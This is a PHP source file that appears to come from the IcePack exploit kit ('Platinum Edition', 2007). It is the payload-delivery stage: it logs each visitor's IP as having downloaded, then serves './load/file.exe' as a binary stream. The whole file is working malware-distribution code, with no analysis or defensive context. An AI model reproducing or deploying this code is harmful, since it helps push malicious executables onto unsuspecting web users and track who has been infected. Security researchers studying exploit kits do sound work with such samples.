<?php
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	IcePack Platinum Edition
-----------------------------------------------------
	2007 (c) IDT Group
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/

include "db.php";
include "mysql.php";

$db = new db;
$ip = getenv("REMOTE_ADDR");
$db->query("UPDATE statistics SET is_dw=1 WHERE ip='".$ip."'");

$filename = "./load/file.exe";
$size = filesize($filename);
$fp = fopen($filename, "r");
$source = fread($fp, $size);
fclose($fp);

header("Accept-Ranges: bytes\r\n");
header("Content-Length: ".$size."\r\n");
header("Content-Disposition: inline; filename=".$filename);
header("\r\n");
header("Content-Type: application/octet-stream\r\n\r\n");
echo $source;

?>